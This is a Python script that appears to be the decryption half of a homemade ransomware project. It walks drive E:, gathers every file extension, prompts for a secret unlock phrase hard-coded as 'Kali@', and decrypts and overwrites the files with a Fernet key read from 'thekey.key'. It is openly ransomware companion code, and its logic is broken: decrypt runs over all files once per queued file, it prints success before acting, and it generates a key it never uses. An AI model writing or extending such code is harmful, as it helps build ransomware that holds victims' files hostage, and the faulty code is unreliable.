import os
from threading import Thread
from queue import Queue
import pandas as pd
from cryptography.fernet import Fernet

q = Queue()

# Decryption Information
key = Fernet.generate_key()


# grab all files from the machine
ListFiles = os.walk(str ('E:'))
SplitTypes = []
for walk_output in ListFiles:
    for file_name in walk_output[-1]:
        SplitTypes.append(str('.')+file_name.split(".")[-1])
SplitTypes
df = pd.DataFrame(SplitTypes, columns = ['extension_names'])

# Get unique values
uv = df.extension_names.unique()
uv

# File extensions to encrypt 
encrypted_ext = (uv)
encrypted_ext


file_paths = []
for root, dirs, files in os.walk('E:'): # (E:\\) is my flash drive
    for file in files: 
        file_path, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)
print('Successfully located all files!')


user_phrase = input('Enter secretkey to open your files\n')  
secret_phrase = 'Kali@'

# Decrypt files
def decrypt(key):
     while not q.empty():
        file = q.get()
        print(f'Decrypting {file}') 
        print(f'{file} SUCCESSFULLY DECRYPTED')
        try:
            with open('thekey.key', 'rb') as key:
                 secretkey = key.read()
            if user_phrase == secret_phrase:    
                for file in file_paths:
                    with open(file, 'rb') as thefile:
                        contents = thefile.read()
                    contents_decrypted = Fernet(secretkey).decrypt(contents)
                    with open(file, 'wb') as thefile:
                        thefile.write(contents_decrypted)
        except PermissionError:
            # files with admin priviledges are skipped
            print('DECRYPTION FAILED: Permission denied')
        except Exception as e:
            # handle other exceptions
            print(f'DECRYPTING EXCEPTIONS: {e}')
        q.task_done()
        
        
        
# Setup queue with jobs for threads to decrypt
q = Queue() # store files into a queue for threads to handle
for file in file_paths:
    q.put(file)

# setup threads to get ready for encryption    
thread = Thread(target=decrypt, args=(user_phrase,), daemon=True)
thread.start()
    
q.join()
print('DECRYPTION AND DOWNLOAD COMPLETE')